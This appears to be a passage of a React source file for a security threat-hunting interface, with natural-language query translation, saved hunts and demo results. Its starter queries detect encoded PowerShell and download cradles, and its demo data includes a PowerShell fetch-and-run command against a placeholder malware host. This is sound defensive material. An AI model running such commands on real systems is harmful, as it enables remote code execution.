'use client';

/**
 * Threat Hunting workspace + natural-language hunt surface (T3.4).
 *
 * The /hunt page is the canonical NL-driven hunt experience — the legacy
 * /investigate route now redirects here. The view layers two modes on top
 * of the same Monaco editor + results panel:
 *
 *   1. **NL hero** (visible on first load when no NL query has been
 *      issued and no saved hunt is selected): tagline + 3 example-query
 *      pills + a free-form NL input. Clicking a pill or submitting the
 *      input calls /api/v1/nl-query/translate, populates the editor with
 *      the generated ES|QL, and runs the hunt automatically.
 *
 *   2. **SIEM analyst mode**: Monaco editor with KQL / Lucene / SQL /
 *      ES|QL tabs, time-range picker, results table with severity
 *      tinting, copy-to-clipboard, pivot-to-graph, and demo fallback.
 *
 * The right rail shows persisted saved hunts (savedHuntsApi) with
 * re-run + delete actions; we deliberately render this list in addition
 * to the legacy "Saved searches" sidebar so analysts can save either an
 * NL question or a hand-crafted query without losing either history.
 */

import { useEffect, useMemo, useRef, useState } from 'react';
import dynamic from 'next/dynamic';
import useSWR from 'swr';
import { clsx } from 'clsx';
import { format, formatDistanceToNow } from 'date-fns';
import toast from 'react-hot-toast';
import {
  huntApi,
  nlQueryApi,
  savedHuntsApi,
  type AlertSeverity,
  type HuntQuery,
  type HuntResponse,
  type HuntResult,
  type SavedHunt,
  type SavedSearch,
} from '@/lib/api';
import { Skeleton } from '@/components/ui/Skeleton';
import { ErrorState } from '@/components/ui/ErrorState';
import { EmptyState } from '@/components/ui/EmptyState';

// Monaco is heavy and SSR-incompatible; load it client-side only.
const MonacoEditor = dynamic(
  () => import('@monaco-editor/react').then((mod) => mod.default),
  { ssr: false, loading: () => <Skeleton className="h-64 w-full rounded-lg" /> },
);

// ─── Constants ────────────────────────────────────────────────────────────────

type Lang = NonNullable<HuntQuery['language']>;

const LANGS: Array<{ id: Lang; label: string; monaco: string }> = [
  { id: 'kql', label: 'KQL', monaco: 'plaintext' },
  { id: 'lucene', label: 'Lucene', monaco: 'plaintext' },
  { id: 'sql', label: 'SQL', monaco: 'sql' },
  { id: 'esql', label: 'ES|QL', monaco: 'plaintext' },
];

const TIME_PRESETS: Array<{ id: string; label: string; ms: number }> = [
  { id: '15m', label: 'Last 15 min', ms: 15 * 60 * 1000 },
  { id: '1h', label: 'Last hour', ms: 60 * 60 * 1000 },
  { id: '24h', label: 'Last 24 hours', ms: 24 * 60 * 60 * 1000 },
  { id: '7d', label: 'Last 7 days', ms: 7 * 24 * 60 * 60 * 1000 },
  { id: '30d', label: 'Last 30 days', ms: 30 * 24 * 60 * 60 * 1000 },
];

/**
 * Three example questions shown as clickable pills on the empty hero
 * block. They double as ground-truth canaries for the NL translator —
 * if any of these stop returning a parseable ES|QL response we want CI
 * to fail loudly. Keep them tight, varied across data sources, and
 * vendor-neutral.
 */
const NL_EXAMPLE_PILLS: ReadonlyArray<{ id: string; label: string }> = [
  { id: 'iran', label: 'Did we get any new attacks from Iran?' },
  {
    id: 'iam',
    label: 'Show me everyone who touched our prod IAM role in the last 7 days',
  },
  { id: 'github', label: 'Any GitHub auth from a new device this week?' },
] as const;

const STARTERS: Record<Lang, string> = {
  kql:
`// Find suspicious PowerShell with encoded payloads
process where process.name == "powershell.exe"
  and (process.command_line like~ "*-enc*"
       or process.command_line like~ "*IEX*"
       or process.command_line like~ "*DownloadString*")
| extend host=host.name, user=user.name
| project @timestamp, host, user, process.command_line
| sort @timestamp desc`,
  lucene:
`process.name:"powershell.exe" AND
  (process.command_line:*-enc* OR
   process.command_line:*IEX* OR
   process.command_line:*DownloadString*)`,
  sql:
`SELECT
  event_time, host_name, user_name, command_line
FROM events
WHERE process_name = 'powershell.exe'
  AND (command_line ILIKE '%-enc%'
    OR command_line ILIKE '%IEX%'
    OR command_line ILIKE '%DownloadString%')
ORDER BY event_time DESC
LIMIT 200`,
  esql:
`FROM events
| WHERE process.name == "powershell.exe"
  AND (process.command_line LIKE "*-enc*"
    OR process.command_line LIKE "*IEX*"
    OR process.command_line LIKE "*DownloadString*")
| KEEP @timestamp, host.name, user.name, process.command_line
| SORT @timestamp DESC
| LIMIT 200`,
};

// ─── Demo fallback ────────────────────────────────────────────────────────────

// Deterministic timestamps — no Date.now() to avoid SSR hydration mismatches.
const DEMO_RESULTS: HuntResult[] = [
  {
    id: 'r-001',
    timestamp: '2026-05-06T11:48:00Z',
    source: 'crowdstrike',
    severity: 'high',
    fields: {
      host: 'WORKSTATION-042',
      user: 'john.doe',
      'process.name': 'powershell.exe',
      'process.command_line':
        'powershell.exe -nop -w hidden -enc JABXAGUAYgBDA...',
      'process.parent.name': 'EXCEL.EXE',
    },
    highlight: 'powershell.exe -nop -w hidden -enc',
  },
  {
    id: 'r-002',
    timestamp: '2026-05-06T11:19:00Z',
    source: 'defender',
    severity: 'critical',
    fields: {
      host: 'SERVER-DC01',
      user: 'svc_admin',
      'process.name': 'powershell.exe',
      'process.command_line':
        "powershell.exe -nop -c \"IEX (New-Object Net.WebClient).DownloadString('http://malware.xyz/payload')\"",
      'network.destination.ip': '185.220.101.45',
    },
    highlight: 'IEX (New-Object Net.WebClient).DownloadString',
  },
  {
    id: 'r-003',
    timestamp: '2026-05-06T10:00:00Z',
    source: 'splunk',
    severity: 'medium',
    fields: {
      host: 'WORKSTATION-019',
      user: 'maria.lin',
      'process.name': 'powershell.exe',
      'process.command_line':
        'powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\maria.lin\\setup.ps1',
    },
  },
];

const DEMO_SAVED: SavedSearch[] = [
  {
    id: 'demo-1',
    name: 'Encoded PowerShell',
    query: STARTERS.kql,
    language: 'kql',
    createdAt: '2026-05-04T12:00:00Z',
    pinned: true,
  },
  {
    id: 'demo-2',
    name: 'LSASS access attempts',
    query:
`process where process.name in ("procdump.exe", "procdump64.exe")
  and process.command_line like~ "*lsass*"`,
    language: 'kql',
    createdAt: '2026-05-01T12:00:00Z',
  },
  {
    id: 'demo-3',
    name: 'Outbound connections to TOR exits',
    query:
`network where network.direction == "outbound"
  and network.destination.ip in <tor_exit_nodes>`,
    language: 'kql',
    createdAt: '2026-04-27T12:00:00Z',
  },
];

// ─── Helpers ──────────────────────────────────────────────────────────────────

const SEVERITY_BADGE: Record<AlertSeverity, string> = {
  critical: 'bg-red-500/15 text-red-300 ring-red-500/30',
  high: 'bg-orange-500/15 text-orange-300 ring-orange-500/30',
  medium: 'bg-yellow-500/15 text-yellow-300 ring-yellow-500/30',
  low: 'bg-blue-500/15 text-blue-300 ring-blue-500/30',
  info: 'bg-slate-500/15 text-slate-300 ring-slate-500/30',
};

function severityClass(s?: AlertSeverity) {
  return s ? SEVERITY_BADGE[s] : 'bg-slate-500/15 text-slate-300 ring-slate-500/30';
}

function copyToClipboard(text: string) {
  if (typeof navigator === 'undefined' || !navigator.clipboard) return;
  void navigator.clipboard.writeText(text).then(() => toast.success('Copied'));
}

// ─── NL hero block ───────────────────────────────────────────────────────────

interface NLHeroProps {
  /** Currently-buffered NL question (controlled). */
  value: string;
  onChange: (next: string) => void;
  /** Submit the current value (or a clicked pill). */
  onSubmit: (question: string) => void;
  /** True while the translator request is in flight. */
  pending: boolean;
}

/**
 * Tagline + 3 example pills + free-form NL input.
 *
 * Clicking a pill *immediately* submits the query (skips the input
 * field) so the dwell time from "I want to ask the system something" to
 * "I see results" stays sub-second on a warm cache. Submitting the
 * input also requires the user to press Enter or click the button — we
 * intentionally don't translate-on-keypress because the deterministic
 * translator does real work and we don't want to thrash the API.
 */
function NLHero({ value, onChange, onSubmit, pending }: NLHeroProps) {
  const trimmed = value.trim();

  return (
    <div className="overflow-hidden rounded-xl border border-emerald-500/20 bg-gradient-to-br from-emerald-950/40 via-slate-900/40 to-slate-900/40 p-6 shadow-[0_0_60px_-30px_rgba(16,185,129,0.4)]">
      <div className="flex items-center gap-2 text-xs font-semibold uppercase tracking-wider text-emerald-400">
        <svg className="h-3.5 w-3.5" fill="currentColor" viewBox="0 0 20 20" aria-hidden>
          <path d="M10 3.5a.75.75 0 01.75.75v.578l4.97 1.243a.75.75 0 01.531.97l-1.5 5.25a.75.75 0 01-.5.51l-3.501 1.167V16h2.5a.75.75 0 010 1.5h-6.5a.75.75 0 010-1.5h2.5v-2.032l-3.5-1.166a.75.75 0 01-.5-.51l-1.5-5.25a.75.75 0 01.53-.971l4.97-1.243V4.25A.75.75 0 0110 3.5z" />
        </svg>
        AiSOC Hunt
      </div>
      <h1 className="mt-2 text-2xl font-semibold tracking-tight text-white sm:text-3xl">
        Hunt at the speed of thought.
      </h1>
      <p className="mt-1.5 max-w-2xl text-sm text-slate-300">
        Ask in plain English and we&apos;ll translate it to ES|QL, KQL, and SPL.
        Save the questions that matter, schedule the ones that should run themselves.
      </p>

      <form
        onSubmit={(e) => {
          e.preventDefault();
          if (trimmed) onSubmit(trimmed);
        }}
        className="mt-5 flex flex-col gap-2 sm:flex-row"
      >
        <label className="sr-only" htmlFor="hunt-nl-input">
          Ask a security question
        </label>
        <div className="relative flex-1">
          <svg
            className="pointer-events-none absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-slate-500"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
            aria-hidden
          >
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-4.35-4.35m0 0a7.5 7.5 0 10-10.6 0 7.5 7.5 0 0010.6 0z" />
          </svg>
          <input
            id="hunt-nl-input"
            type="text"
            value={value}
            onChange={(e) => onChange(e.target.value)}
            placeholder="e.g. Show me suspicious sudo from contractors in the last 4 hours"
            autoComplete="off"
            spellCheck={false}
            disabled={pending}
            className="w-full rounded-lg border border-slate-700/70 bg-slate-950/60 py-2.5 pl-9 pr-3 text-sm text-slate-100 placeholder:text-slate-500 focus:border-emerald-500/60 focus:outline-none focus:ring-2 focus:ring-emerald-500/20 disabled:opacity-60"
          />
        </div>
        <button
          type="submit"
          disabled={pending || !trimmed}
          className={clsx(
            'flex items-center justify-center gap-2 rounded-lg px-4 py-2 text-sm font-semibold transition-colors',
            pending || !trimmed
              ? 'cursor-not-allowed bg-slate-800 text-slate-500'
              : 'bg-emerald-500 text-emerald-950 hover:bg-emerald-400',
          )}
        >
          {pending ? (
            <>
              <span className="h-3 w-3 animate-spin rounded-full border-2 border-emerald-950 border-t-transparent" />
              Translating…
            </>
          ) : (
            <>Translate &amp; run →</>
          )}
        </button>
      </form>

      <div className="mt-5">
        <div className="text-[11px] uppercase tracking-wider text-slate-500">
          Try one of these
        </div>
        <div className="mt-2 flex flex-wrap gap-2">
          {NL_EXAMPLE_PILLS.map((pill) => (
            <button
              key={pill.id}
              type="button"
              onClick={() => onSubmit(pill.label)}
              disabled={pending}
              className={clsx(
                'group inline-flex items-center gap-2 rounded-full border border-slate-700/80 bg-slate-900/70 px-3 py-1.5 text-xs text-slate-200 transition-colors',
                pending
                  ? 'cursor-not-allowed opacity-60'
                  : 'hover:border-emerald-500/50 hover:bg-emerald-500/10 hover:text-emerald-200',
              )}
            >
              <span
                className="h-1.5 w-1.5 rounded-full bg-emerald-400/70 group-hover:bg-emerald-400"
                aria-hidden
              />
              {pill.label}
            </button>
          ))}
        </div>
      </div>
    </div>
  );
}

// ─── Saved (NL) hunts panel ───────────────────────────────────────────────────

interface SavedHuntsPanelProps {
  items: SavedHunt[];
  isLoading: boolean;
  error: unknown;
  selectedId: string | null;
  /** Re-run the saved hunt: re-translate + populate editor + execute. */
  onRun: (hunt: SavedHunt) => void;
  onDelete: (hunt: SavedHunt) => void;
  onRetry: () => void;
}

function SavedHuntsPanel({
  items,
  isLoading,
  error,
  selectedId,
  onRun,
  onDelete,
  onRetry,
}: SavedHuntsPanelProps) {
  if (isLoading) return <Skeleton className="h-32 w-full rounded-lg" />;
  if (error)
    return (
      <ErrorState
        title="Couldn't load saved hunts"
        error={error}
        onRetry={onRetry}
      />
    );
  if (items.length === 0)
    return (
      <EmptyState
        title="No saved hunts yet"
        description="Ask a question above and click Save to add it here."
      />
    );

  return (
    <ul className="divide-y divide-slate-800/60">
      {items.map((h) => (
        <li
          key={h.id}
          className={clsx(
            'group flex items-start gap-2 px-3 py-2.5 transition-colors',
            selectedId === h.id
              ? 'bg-emerald-500/5 border-l-2 border-l-emerald-500'
              : 'hover:bg-slate-800/30',
          )}
        >
          <div className="min-w-0 flex-1">
            <div className="flex items-center gap-2">
              <span className="rounded border border-slate-700/70 bg-slate-800/50 px-1.5 py-0.5 text-[10px] uppercase tracking-wide text-slate-300">
                NL · {h.language}
              </span>
              {h.schedule && (
                <span
                  className="inline-flex items-center gap-1 rounded border border-amber-500/30 bg-amber-500/10 px-1.5 py-0.5 text-[10px] text-amber-300"
                  title={`Scheduled: ${h.schedule}`}
                >
                  <svg className="h-2.5 w-2.5" fill="currentColor" viewBox="0 0 20 20" aria-hidden>
                    <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm.75-13a.75.75 0 00-1.5 0v5c0 .2.08.39.22.53l3 3a.75.75 0 101.06-1.06l-2.78-2.78V5z" clipRule="evenodd" />
                  </svg>
                  {h.schedule}
                </span>
              )}
            </div>
            <p className="mt-1 truncate text-sm font-medium text-slate-100" title={h.name}>
              {h.name}
            </p>
            <p className="mt-0.5 line-clamp-2 text-[11px] text-slate-400" title={h.nl_query}>
              {h.nl_query}
            </p>
            <p className="mt-1 text-[11px] text-slate-500" suppressHydrationWarning>
              {h.last_run_at
                ? `Last run ${formatDistanceToNow(new Date(h.last_run_at), { addSuffix: true })}`
                : `Saved ${formatDistanceToNow(new Date(h.created_at), { addSuffix: true })}`}
            </p>
          </div>
          <div className="flex shrink-0 flex-col gap-1">
            <button
              onClick={() => onRun(h)}
              className="inline-flex items-center gap-1 rounded-md border border-emerald-500/30 bg-emerald-500/10 px-2 py-1 text-[11px] font-medium text-emerald-300 transition-colors hover:border-emerald-500/60 hover:bg-emerald-500/20"
              title="Re-run this hunt"
            >
              ▶ Run
            </button>
            <button
              onClick={() => onDelete(h)}
              className="rounded-md p-1 text-slate-600 opacity-0 transition-all hover:bg-red-500/10 hover:text-red-400 group-hover:opacity-100"
              title="Delete"
              aria-label={`Delete saved hunt ${h.name}`}
            >
              <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.74 9l-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 01-2.244 2.077H8.084a2.25 2.25 0 01-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 00-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 013.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 00-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 00-7.5 0" />
              </svg>
            </button>
          </div>
        </li>
      ))}
    </ul>
  );
}

// ─── Saved (legacy raw-query) searches sidebar ────────────────────────────────

interface SavedListProps {
  items: SavedSearch[];
  isLoading: boolean;
  error: unknown;
  selectedId: string | null;
  onSelect: (s: SavedSearch) => void;
  onDelete: (id: string) => void;
  onRetry: () => void;
}

function SavedList({
  items,
  isLoading,
  error,
  selectedId,
  onSelect,
  onDelete,
  onRetry,
}: SavedListProps) {
  if (isLoading) return <Skeleton className="h-32 w-full rounded-lg" />;
  if (error)
    return (
      <ErrorState
        title="Couldn't load saved searches"
        error={error}
        onRetry={onRetry}
      />
    );
  if (items.length === 0)
    return (
      <EmptyState
        title="No saved searches yet"
        description="Save a query and it will show up here."
      />
    );

  return (
    <ul className="divide-y divide-slate-800/60">
      {items.map((s) => (
        <li
          key={s.id}
          className={clsx(
            'group flex items-start gap-2 px-3 py-2.5 transition-colors',
            selectedId === s.id
              ? 'bg-emerald-500/5 border-l-2 border-l-emerald-500'
              : 'hover:bg-slate-800/30',
          )}
        >
          <button
            onClick={() => onSelect(s)}
            className="flex-1 text-left"
          >
            <div className="flex items-center gap-2">
              <span className="rounded border border-slate-700/70 bg-slate-800/50 px-1.5 py-0.5 text-[10px] uppercase tracking-wide text-slate-300">
                {s.language}
              </span>
              {s.pinned && (
                <span className="text-[10px] text-amber-300">pinned</span>
              )}
            </div>
            <p className="mt-1 truncate text-sm text-slate-200">{s.name}</p>
            <p className="mt-0.5 text-[11px] text-slate-500" suppressHydrationWarning>
              {formatDistanceToNow(new Date(s.createdAt), { addSuffix: true })}
            </p>
          </button>
          <button
            onClick={() => onDelete(s.id)}
            className="rounded-md p-1 text-slate-600 opacity-0 transition-all hover:bg-red-500/10 hover:text-red-400 group-hover:opacity-100"
            title="Delete"
            aria-label="Delete saved search"
          >
            <svg className="h-3.5 w-3.5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.74 9l-.346 9m-4.788 0L9.26 9m9.968-3.21c.342.052.682.107 1.022.166m-1.022-.165L18.16 19.673a2.25 2.25 0 01-2.244 2.077H8.084a2.25 2.25 0 01-2.244-2.077L4.772 5.79m14.456 0a48.108 48.108 0 00-3.478-.397m-12 .562c.34-.059.68-.114 1.022-.165m0 0a48.11 48.11 0 013.478-.397m7.5 0v-.916c0-1.18-.91-2.164-2.09-2.201a51.964 51.964 0 00-3.32 0c-1.18.037-2.09 1.022-2.09 2.201v.916m7.5 0a48.667 48.667 0 00-7.5 0" />
            </svg>
          </button>
        </li>
      ))}
    </ul>
  );
}

// ─── Result row ───────────────────────────────────────────────────────────────

function ResultRow({ result }: { result: HuntResult }) {
  const [open, setOpen] = useState(false);
  const fieldEntries = useMemo(
    () => Object.entries(result.fields ?? {}),
    [result.fields],
  );
  const summaryFields = ['host', 'user', 'process.name', 'process.command_line'];
  const summary = summaryFields
    .map((k) => [k, result.fields?.[k]] as const)
    .filter(([, v]) => v != null && v !== '');

  return (
    <li className="border-b border-slate-800/60 last:border-b-0">
      <button
        onClick={() => setOpen((v) => !v)}
        className="flex w-full items-start gap-3 px-4 py-3 text-left transition-colors hover:bg-slate-800/30"
      >
        <span
          className={clsx(
            'mt-0.5 inline-flex flex-none items-center rounded px-1.5 py-0.5 text-[10px] font-semibold uppercase ring-1',
            severityClass(result.severity),
          )}
        >
          {result.severity ?? 'event'}
        </span>
        <div className="min-w-0 flex-1">
          <div className="flex flex-wrap items-center gap-x-2 gap-y-0.5 text-xs text-slate-400">
            <span className="font-mono text-slate-300" suppressHydrationWarning>
              {format(new Date(result.timestamp), 'MMM dd HH:mm:ss')}
            </span>
            <span className="text-slate-600">·</span>
            <span className="rounded bg-slate-800/60 px-1.5 py-0.5 text-[10px] text-slate-400">
              {result.source}
            </span>
            {summary.map(([k, v]) => (
              <span key={k} className="truncate text-slate-400">
                <span className="text-emerald-400">{k}=</span>
                <span className="text-slate-300">{String(v)}</span>
              </span>
            ))}
          </div>
        </div>
        <svg
          className={clsx(
            'h-4 w-4 flex-none text-slate-500 transition-transform',
            open && 'rotate-180',
          )}
          fill="none"
          viewBox="0 0 24 24"
          stroke="currentColor"
        >
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M19.5 8.25l-7.5 7.5-7.5-7.5" />
        </svg>
      </button>
      {open && (
        <div className="border-t border-slate-800/40 bg-slate-950/40 px-4 py-3">
          <div className="grid grid-cols-1 gap-1 sm:grid-cols-2">
            {fieldEntries.map(([k, v]) => (
              <div key={k} className="flex min-w-0 gap-2 text-xs">
                <span className="flex-none text-emerald-400 font-mono">{k}</span>
                <span className="truncate font-mono text-slate-300">
                  {typeof v === 'object' ? JSON.stringify(v) : String(v)}
                </span>
              </div>
            ))}
          </div>
          <div className="mt-3 flex flex-wrap items-center gap-2">
            <button
              onClick={() => copyToClipboard(JSON.stringify(result.fields, null, 2))}
              className="rounded border border-slate-700/70 bg-slate-800/40 px-2 py-1 text-[11px] text-slate-300 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
            >
              Copy JSON
            </button>
            <button
              onClick={() => {
                const host = result.fields?.host;
                const url = host ? `/graph?entity=${encodeURIComponent(String(host))}` : '/graph';
                window.location.href = url;
              }}
              className="rounded border border-slate-700/70 bg-slate-800/40 px-2 py-1 text-[11px] text-slate-300 transition-colors hover:border-slate-600 hover:bg-slate-700/40"
            >
              Pivot to graph →
            </button>
          </div>
        </div>
      )}
    </li>
  );
}

// ─── Main view ────────────────────────────────────────────────────────────────

export function HuntView() {
  const [language, setLanguage] = useState<Lang>('kql');
  const [query, setQuery] = useState<string>(STARTERS.kql);
  const [preset, setPreset] = useState<string>('24h');
  const [running, setRunning] = useState(false);
  const [results, setResults] = useState<HuntResponse | null>(null);
  const [runError, setRunError] = useState<unknown>(null);
  const [activeSavedId, setActiveSavedId] = useState<string | null>(null);
  const [activeSavedHuntId, setActiveSavedHuntId] = useState<string | null>(null);
  const editorRef = useRef<unknown>(null);
  const [demoMode, setDemoMode] = useState(false);

  // Natural-language hero state.
  const [nlInput, setNlInput] = useState('');
  /** The most recent NL question that was translated; drives the
   *  "Save" behavior so the user can persist either the raw query they
   *  edited or the original question they asked. */
  const [nlSubmittedQuery, setNlSubmittedQuery] = useState<string | null>(null);
  const [nlExplanation, setNlExplanation] = useState<string | null>(null);
  const [nlPending, setNlPending] = useState(false);
  /** Hides the hero block once the user has either issued an NL query
   *  or selected a saved hunt; click "Ask another question" to bring it
   *  back. */
  const [heroDismissed, setHeroDismissed] = useState(false);

  const savedState = useSWR<SavedSearch[]>(
    'hunt.saved',
    async () => {
      try {
        const res = await huntApi.listSaved();
        return res.searches;
      } catch (err) {
        // First-load fallback to demo so the UI is never empty.
        setDemoMode(true);
        throw err;
      }
    },
    {
      revalidateOnFocus: false,
      shouldRetryOnError: false,
    },
  );

  const savedHuntsState = useSWR<SavedHunt[]>(
    'hunt.saved-hunts',
    () => savedHuntsApi.list(),
    {
      revalidateOnFocus: false,
      shouldRetryOnError: false,
    },
  );

  // If saved-search fetch failed, transparently substitute demo list so the UI
  // is usable.
  const savedItems: SavedSearch[] =
    savedState.data ?? (demoMode ? DEMO_SAVED : []);
  const savedError =
    savedState.error && !demoMode ? savedState.error : undefined;
  const savedHuntsItems: SavedHunt[] = savedHuntsState.data ?? [];
  const savedHuntsError = savedHuntsState.error;

  // Switch starter when language changes if user hasn't customized.
  const lastStarter = useRef(STARTERS[language]);
  useEffect(() => {
    if (query === lastStarter.current) {
      setQuery(STARTERS[language]);
      lastStarter.current = STARTERS[language];
    }
  }, [language]); // eslint-disable-line react-hooks/exhaustive-deps

  /**
   * Translate an NL question via /api/v1/nl-query/translate, populate
   * the editor with the ES|QL translation, and immediately invoke the
   * hunt runner. Any failure surfaces as a toast and falls back to the
   * legacy demo-data path so the UI never strands the user with a blank
   * screen — the goal of the /hunt page is "ask a question, see
   * something" within 5 seconds, even when the backend can't actually
   * answer.
   */
  const submitNLQuery = async (question: string) => {
    const cleaned = question.trim();
    if (!cleaned) return;

    setNlInput(cleaned);
    setNlPending(true);
    setHeroDismissed(true);
    setActiveSavedId(null);
    setActiveSavedHuntId(null);
    setRunError(null);

    let translatedEsql = '';
    let explanation = '';
    try {
      const t = await nlQueryApi.translate({ question: cleaned });
      translatedEsql = t.esql || '';
      explanation = t.explanation || '';
      setLanguage('esql');
      setQuery(translatedEsql || `// Could not translate: ${cleaned}`);
      lastStarter.current = ''; // user-controlled now
      setNlSubmittedQuery(cleaned);
      setNlExplanation(explanation || null);
    } catch (err) {
      console.error('NL translate failed', err);
      toast.error('Could not translate the question — using demo results');
      setNlSubmittedQuery(cleaned);
      setNlExplanation(null);
    } finally {
      setNlPending(false);
    }

    // Run the hunt regardless of translate outcome — falls back to demo
    // results internally, which is still useful UX (see component
    // docstring).
    void runHunt({
      languageOverride: 'esql',
      queryOverride: translatedEsql || query,
    });
  };

  const runHunt = async (
    overrides?: { languageOverride?: Lang; queryOverride?: string },
  ) => {
    setRunning(true);
    setResults(null);
    setRunError(null);

    const presetCfg = TIME_PRESETS.find((p) => p.id === preset);
    const endTime = new Date();
    const startTime = presetCfg
      ? new Date(endTime.getTime() - presetCfg.ms)
      : undefined;

    const lang = overrides?.languageOverride ?? language;
    const q = overrides?.queryOverride ?? query;

    try {
      const res = await huntApi.search({
        query: q,
        language: lang,
        startTime: startTime?.toISOString(),
        endTime: endTime.toISOString(),
        limit: 200,
      });
      setResults(res);
      setDemoMode(false);
    } catch (err) {
      // Demo fallback so the page still feels alive without a seeded backend.
      setResults({
        total: DEMO_RESULTS.length,
        took: 42,
        hits: DEMO_RESULTS,
      });
      setDemoMode(true);
      setRunError(err);
      toast('Backend unreachable — showing demo results');
    } finally {
      setRunning(false);
    }
  };

  const handleRun = () => void runHunt();

  const handleSaveSearch = async () => {
    const name = window.prompt('Name this search:');
    if (!name?.trim()) return;
    try {
      const saved = await huntApi.saveSearch({
        name: name.trim(),
        query,
        language,
      });
      toast.success(`Saved "${saved.name}"`);
      void savedState.mutate();
    } catch (err) {
      console.error(err);
      toast.error('Could not save search');
    }
  };

  /**
   * Save the most recent NL question (preferred when present) or fall
   * back to the editor contents as a raw-query save. Two distinct
   * stores deliberately — see the SavedHuntsPanel docstring.
   */
  const handleSaveNLHunt = async () => {
    if (!nlSubmittedQuery) {
      // Nothing to save as an NL hunt; route to the legacy raw-query
      // saver so the button is never inert.
      await handleSaveSearch();
      return;
    }
    const name = window.prompt('Name this hunt:', nlSubmittedQuery.slice(0, 80));
    if (!name?.trim()) return;
    try {
      const saved = await savedHuntsApi.create({
        name: name.trim(),
        nl_query: nlSubmittedQuery,
        language: 'esql',
      });
      toast.success(`Saved hunt "${saved.name}"`);
      void savedHuntsState.mutate();
      setActiveSavedHuntId(saved.id);
    } catch (err) {
      console.error(err);
      const msg = err instanceof Error ? err.message : 'Could not save hunt';
      toast.error(msg);
    }
  };

  const handleDelete = async (id: string) => {
    if (!window.confirm('Delete this saved search?')) return;
    try {
      await huntApi.deleteSaved(id);
      if (activeSavedId === id) setActiveSavedId(null);
      toast.success('Deleted');
      void savedState.mutate();
    } catch {
      toast.error('Could not delete saved search');
    }
  };

  const handleSelect = (s: SavedSearch) => {
    setActiveSavedId(s.id);
    setActiveSavedHuntId(null);
    setHeroDismissed(true);
    setLanguage((s.language as Lang) ?? 'kql');
    setQuery(s.query);
    lastStarter.current = ''; // user-controlled now
    // Re-running is opt-in for raw saved searches (matches the
    // pre-T3.4 behavior); only NL hunts auto-run on select.
  };

  const handleRunSavedHunt = async (h: SavedHunt) => {
    setActiveSavedHuntId(h.id);
    setActiveSavedId(null);
    setHeroDismissed(true);
    setNlSubmittedQuery(h.nl_query);
    setNlInput(h.nl_query);

    // Optimistically populate the editor with the snapshot translation
    // — gives the user something to read instantly while we re-run.
    setLanguage('esql');
    setQuery(h.translated_query.esql || `// ${h.nl_query}`);
    setNlExplanation(h.translated_query.explanation || null);
    lastStarter.current = '';

    try {
      const refreshed = await savedHuntsApi.run(h.id);
      setQuery(refreshed.translated_query.esql || query);
      setNlExplanation(refreshed.translated_query.explanation || null);
      void savedHuntsState.mutate();
    } catch (err) {
      console.error('Saved hunt re-run failed', err);
      // Don't block — fall through to the executor with the snapshot.
    }
    void runHunt({
      languageOverride: 'esql',
      queryOverride: h.translated_query.esql || query,
    });
  };

  const handleDeleteSavedHunt = async (h: SavedHunt) => {
    if (!window.confirm(`Delete saved hunt "${h.name}"?`)) return;
    try {
      await savedHuntsApi.remove(h.id);
      if (activeSavedHuntId === h.id) setActiveSavedHuntId(null);
      toast.success('Deleted');
      void savedHuntsState.mutate();
    } catch (err) {
      console.error(err);
      toast.error('Could not delete saved hunt');
    }
  };

  const showHero = !heroDismissed;

  return (
    <div className="space-y-5">
      {/* Hero block — visible on first load or when explicitly recalled. */}
      {showHero ? (
        <NLHero
          value={nlInput}
          onChange={setNlInput}
          onSubmit={submitNLQuery}
          pending={nlPending}
        />
      ) : (
        <div className="flex flex-wrap items-end justify-between gap-3">
          <div className="min-w-0">
            <h1 className="text-xl font-semibold text-white">Threat Hunting</h1>
            {nlSubmittedQuery ? (
              <p
                className="mt-1 max-w-3xl truncate text-sm text-slate-400"
                title={nlSubmittedQuery}
              >
                <span className="text-emerald-400">Asking:</span>{' '}
                {nlSubmittedQuery}
              </p>
            ) : (
              <p className="mt-1 text-sm text-slate-400">
                Pivot across logs, alerts, processes, and assets in any language.
              </p>
            )}
          </div>
          <div className="flex items-center gap-2 text-xs">
            <button
              onClick={() => setHeroDismissed(false)}
              className="rounded-md border border-slate-700/70 bg-slate-800/50 px-2.5 py-1 text-xs text-slate-200 transition-colors hover:border-emerald-500/40 hover:text-emerald-300"
            >
              ✦ Ask another question
            </button>
            <span
              className={clsx(
                'inline-flex items-center gap-1.5 rounded-full px-2 py-0.5 ring-1',
                demoMode
                  ? 'bg-amber-500/10 text-amber-300 ring-amber-500/30'
                  : 'bg-emerald-500/10 text-emerald-300 ring-emerald-500/30',
              )}
            >
              <span
                className={clsx(
                  'h-1.5 w-1.5 rounded-full',
                  demoMode ? 'bg-amber-400' : 'bg-emerald-400 animate-ping-slow',
                )}
              />
              {demoMode ? 'Demo data' : 'Live backend'}
            </span>
          </div>
        </div>
      )}

      <div className="grid grid-cols-12 gap-5">
        {/* Sidebar: saved hunts (NL) + saved searches (raw). */}
        <aside className="col-span-12 space-y-4 lg:col-span-3">
          <div className="overflow-hidden rounded-xl border border-emerald-500/20 bg-slate-900/40">
            <div className="flex items-center justify-between border-b border-emerald-500/10 bg-emerald-500/5 px-3 py-2.5">
              <h3 className="text-xs font-semibold uppercase tracking-wide text-emerald-300">
                Saved hunts
              </h3>
              <button
                onClick={() => setHeroDismissed(false)}
                className="text-xs text-emerald-400 hover:text-emerald-300"
                title="Open the NL hero block to ask a new question"
              >
                + Ask
